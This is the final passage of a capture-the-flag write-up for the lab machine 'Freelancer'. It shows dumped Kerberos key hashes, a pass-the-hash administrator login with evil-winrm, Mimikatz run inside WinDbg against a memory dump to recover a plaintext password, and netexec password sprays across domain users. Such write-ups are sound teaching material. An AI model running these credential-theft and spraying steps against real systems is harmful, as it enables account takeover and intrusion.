+freelancer.htb\samuel.turner:des-cbc-md5:341f804a94e0fde3
+freelancer.htb\ereed:aes256-cts-hmac-sha1-96:db3028570853a4578221624c3eb479a3e394f51d8ec60382bda68f9f80e85529
+freelancer.htb\ereed:aes128-cts-hmac-sha1-96:4974b1cbb5220fa123a5bd41aabb7bca
+freelancer.htb\ereed:des-cbc-md5:cbbc0efdc8c1df45
+freelancer.htb\leon.sk:aes256-cts-hmac-sha1-96:4deaf484fd929e838817743617af0853e39e4343d6c0955b1939fe4468fd7264
+freelancer.htb\leon.sk:aes128-cts-hmac-sha1-96:2e026c6c4a8b2efc2211416adde3b9c7
+freelancer.htb\leon.sk:des-cbc-md5:31c71a9438a1da38
+DATAC2-2022$:aes256-cts-hmac-sha1-96:b5d0c7873946a3910780851a0922034facec03a4a083700b8724ccb0ba99bdce
+DATAC2-2022$:aes128-cts-hmac-sha1-96:163fdfc01621c567a9bb041bbda1bb3e
+DATAC2-2022$:des-cbc-md5:078376a249862f32
+WS1-WIIN10$:aes256-cts-hmac-sha1-96:509bc5affbf4f45619b1fe8e9e236f14286e2a1fc9435b84747a8e8e440e2dec
+WS1-WIIN10$:aes128-cts-hmac-sha1-96:01a1553fd3358136c6b5421bcb1b7f89
+WS1-WIIN10$:des-cbc-md5:a19b2a8976ce0b9e
+WS2-WIN11$:aes256-cts-hmac-sha1-96:7848ba3e99fab92b8308556b7520ce578d055441a1f6d63b54fb170f7ee4f960
+WS2-WIN11$:aes128-cts-hmac-sha1-96:60f5f618548447a64bbe1b9cad7c2776
+WS2-WIN11$:des-cbc-md5:d60825d9bcc14340
+WS3-WIN11$:aes256-cts-hmac-sha1-96:8b6f4c958a3de942761e09175683dedbbd034d52d8128ce2a96db1fb44611301
+WS3-WIN11$:aes128-cts-hmac-sha1-96:e62e2a9cbb2832548c0d52dc05ff3ba1
+WS3-WIN11$:des-cbc-md5:387f80ce91f792a2
+DC2$:aes256-cts-hmac-sha1-96:ff2dedd696532b956c6cdd47f09ecd175b9c6a167827b75cd4fa2e5312570848
+DC2$:aes128-cts-hmac-sha1-96:5e3c61366b67de3cfe990ca87962bc1b
+DC2$:des-cbc-md5:f170198c9d4c2a29
+freelancer.htb\carol.poland:aes256-cts-hmac-sha1-96:a230f87fafce155b3b02cabbba74c83e7b8ddb4f74a4e6605a06bc980267289b
+freelancer.htb\carol.poland:aes128-cts-hmac-sha1-96:1b383dd738a8768c465e48c46e0dfcbb
+freelancer.htb\carol.poland:des-cbc-md5:041652e5cd97ea6e
+freelancer.htb\lkazanof:aes256-cts-hmac-sha1-96:4ba98049d411ea7293b5924a25c10ae2a3c18f045aa22fb7c828d888820fd719
+freelancer.htb\lkazanof:aes128-cts-hmac-sha1-96:b8fd8c1c1d3dde5c21cf3f482989a718
+freelancer.htb\lkazanof:des-cbc-md5:57f2d5b515020d70
+freelancer.com\liza.kazanof:aes256-cts-hmac-sha1-96:d1d7dadd2fd12b6d08264c0c94d029746871eb6665863a084f60d922d0653b6a
+freelancer.com\liza.kazanof:aes128-cts-hmac-sha1-96:11f98cec8eeec7b3763c11c43a3a0f12
+freelancer.com\liza.kazanof:des-cbc-md5:3eea76a116676d68
+SETUPMACHINE$:aes256-cts-hmac-sha1-96:b88fcc7fe204621b2b3b911a1db4c458fafe7ac3ef57302962461b9ce3db243a
+SETUPMACHINE$:aes128-cts-hmac-sha1-96:118aa6b399016d4eed23e3bc680616f7
+SETUPMACHINE$:des-cbc-md5:b3e56483b052c2ab
+[*] Cleaning up...
+</span></code></pre></div></div>
+<p>And get a shell as administrator:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> freelancer.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 0039318f1e8274633445bce32ad1a290
+<span class="go">                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+</span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="alternative-password-spray">Alternative Password Spray</h3>
+<h4 id="recover-password">Recover Password</h4>
+<p>A dump file like <code class="language-plaintext highlighter-rouge">MEMORY.DMP</code> can be loaded into <a href="http://www.windbg.org/">WinDbg</a>:</p>
+<picture>
+<source srcset="/img/image-20240930182029620.webp" type="image/webp"/>
+<img alt="image-20240930182029620" class="include_image" loading="lazy" src="/img/image-20240930182029620.png"/>
+</picture>
+<p>What’s especially cool is that <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> is made to be loaded here. I’ll load the <code class="language-plaintext highlighter-rouge">mimilib.dll</code> file that comes with Mimikatz with <code class="language-plaintext highlighter-rouge">.load C:\Tools\Mimikatz\x64\mimilib.dll</code>:</p>
+<picture>
+<source srcset="/img/image-20240930182201667.webp" type="image/webp"/>
+<img alt="image-20240930182201667" class="include_image" loading="lazy" src="/img/image-20240930182201667.png"/>
+</picture>
+<p>Next I want to be in the <code class="language-plaintext highlighter-rouge">lsass.exe</code> process. <code class="language-plaintext highlighter-rouge">!process 0 0 lsass.exe</code> will give information about the process, including it’s location in memory:</p>
+<picture>
+<source srcset="/img/image-20240930182313473.webp" type="image/webp"/>
+<img alt="image-20240930182313473" class="include_image" loading="lazy" src="/img/image-20240930182313473.png"/>
+</picture>
+<p>Now I’ll switch to the <code class="language-plaintext highlighter-rouge">lsass.exe</code> context with <code class="language-plaintext highlighter-rouge">.process /r /p ffffbc83a93e7080</code>. If it throws an error about Symbols, that is likely ok. I can try to reload them, but I’ll move on for now.</p>
+<p><code class="language-plaintext highlighter-rouge">!mimikatz</code> will run it on the current process:</p>
+<picture>
+<source srcset="/img/image-20240930182534435.webp" type="image/webp"/>
+<img alt="image-20240930182534435" class="include_image" loading="lazy" src="/img/image-20240930182534435.png"/>
+</picture>
+<p>A ways down, there’s a plaintext password, “v3ryS0l!dP@sswd#29”:</p>
+<picture>
+<source srcset="/img/image-20240930182628393.webp" type="image/webp"/>
+<img alt="image-20240930182628393" class="include_image" loading="lazy" src="/img/image-20240930182628393.png"/>
+</picture>
+<h4 id="spray-password---failure">Spray Password - Failure</h4>
+<p>I’ll try spraying this password against all the users in the domain. I’ve already got enough access to get a full list of users on the domain:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> mikasaAckerman <span class="nt">-p</span> IL0v3ErenY3ager <span class="nt">--users</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               Administrator                 2024-05-27 17:59:50 5       Built-in account for administering the computer/domain
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               Guest                         &lt;never&gt;             6       Built-in account for guest access to the computer/domain
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               krbtgt                        2023-08-24 01:47:22 6       Key Distribution Center Service Account
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               mikasaAckerman                2024-05-27 17:58:13 0       Database Developer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               sshd                          2023-08-28 18:30:29 6
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               SQLBackupOperator             2023-09-21 07:26:05 6       SQL Backup Operator Account for Temp Schudeled SQL Express Backups
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               sql_svc                       2023-11-02 19:10:09 6       MSSQL Database Domain Account
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               lorra199                      2023-10-04 12:19:13 8       IT Support Technician
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               maya.artmes                   2023-10-12 01:15:22 6       System Analyzer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               michael.williams              2023-10-12 01:40:29 6       Department Manager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               sdavis                        2023-10-12 01:44:58 6       IT Support
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               d.jones                       2023-10-12 01:49:15 6       Software Developer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               jen.brown                     2023-10-12 01:51:04 6       Software Developer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               taylor                        2023-10-12 01:52:40 7       Human Resources Specialist
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               jmartinez                     2023-10-12 01:57:32 7       Executive Manager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               olivia.garcia                 2023-10-12 02:19:04 7       WSGI Manager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               dthomas                       2023-10-12 02:45:32 7       System Analyzer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               sophia.h                      2023-10-12 03:02:17 8       Datacenter Manager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               Ethan.l                       2023-10-12 03:11:23 7       DJango Developer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               wwalker                       2023-10-12 03:20:06 7       Active Directory Trusts Manager
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               jgreen                        2023-10-12 03:25:04 8       Active Directory Accounts Operator
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               evelyn.adams                  2023-10-12 03:27:06 8       Active Directory Accounts Operator
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               hking                         2023-10-12 03:35:58 8
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               alex.hill                     2023-10-12 03:40:27 8       DJango Developer
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               samuel.turner                 2023-10-12 03:43:51 8
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               ereed                         2023-10-12 04:04:24 8       Site Reliability Engineer (SRE)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               leon.sk                       2023-11-02 05:20:04 8       Site Reliability Engineer (SRE)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               carol.poland                  2023-11-02 06:20:51 8       IT Technician
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               lkazanof                      2023-10-19 23:39:28 9       System Reliability Monitor (SRM) &amp; Account Operator
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 29 local users: FREELANCER
+</span></code></pre></div></div>
+<p>I’ll make a list and spray them:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> all_domain_users <span class="nt">-p</span> <span class="s1">'v3ryS0l!dP@sswd#29'</span> <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\Administrator:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\Guest:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\krbtgt:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sshd:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\SQLBackupOperator:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lorra199:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\maya.artmes:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\michael.williams:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sdavis:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\d.jones:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\jen.brown:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\taylor:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\jmartinez:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\olivia.garcia:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\dthomas:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sophia.h:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\Ethan.l:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\wwalker:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\jgreen:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\evelyn.adams:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\hking:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\alex.hill:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\samuel.turner:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\ereed:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\leon.sk:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\carol.poland:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE
+</span></code></pre></div></div>
+<p>Nothing.</p>
+<h4 id="expand-password">Expand Password</h4>
+<p>The number at the end looks like something that could be incremented. I’ll generate a list of passwords of the same structure with different numbers:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">seq </span>10 60 | <span class="k">while </span><span class="nb">read </span>num<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s1">'v3ryS0l!dP@sswd#'</span><span class="s2">"</span><span class="nv">$num</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> very_solid_inc
+</code></pre></div></div>
+<p>This spray takes a long time, but it does find a bunch of users (using <code class="language-plaintext highlighter-rouge">grep</code> to show only successful attempts):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> all_domain_users <span class="nt">-p</span> very_solid_inc <span class="nt">--continue-on-success</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'[-]'</span>
+<span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\maya.artmes:v3ryS0l!dP@sswd#31 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\SQLBackupOperator:v3ryS0l!dP@sswd#33 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\sql_svc:v3ryS0l!dP@sswd#34 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\michael.williams:v3ryS0l!dP@sswd#34 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\leon.sk:v3ryS0l!dP@sswd#34 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\carol.poland:v3ryS0l!dP@sswd#34 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\sdavis:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\d.jones:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\jen.brown:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\taylor:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\jmartinez:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\olivia.garcia:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\dthomas:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\sophia.h:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\Ethan.l:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\wwalker:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\jgreen:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\evelyn.adams:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\hking:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\alex.hill:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\samuel.turner:v3ryS0l!dP@sswd#35 
+</span><span class="netexec-protocol">SMB </span><span class="go">                     10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\ereed:v3ryS0l!dP@sswd#35 
+</span></code></pre></div></div>
+<h4 id="identify-account-operators">Identify Account Operators</h4>
+<p>There are four users in the Account Operators group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="s2">"Account Operators"</span><span class="w">
+</span><span class="go">Alias name     Account Operators
+Comment        Members can administer domain user and group accounts
+
+Members
+
+-------------------------------------------------------------------------------
+evelyn.adams
+jgreen
+jmartinez
+lkazanof
+The command completed successfully.
+</span></code></pre></div></div>
+<p>The first three are in the group that I now have passwords for. These provide a path to admin. For example, jgreen:</p>
+<picture>
+<source srcset="/img/image-20240930190001295.webp" type="image/webp"/>
+<img alt="image-20240930190001295" class="include_image" loading="lazy" src="/img/image-20240930190001295.png"/>
+</picture>
+<p>As a member of Account Operators, jgreen is in AD Recycle Bin, which has <code class="language-plaintext highlighter-rouge">GenericWrite</code> over <code class="language-plaintext highlighter-rouge">dc.freelancer.htb</code>. With that privilege, I can use the same path <a href="#exploit-via-rbcd">as above</a>.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2024/10/05/htb-freelancer.html"></a>
+</article>
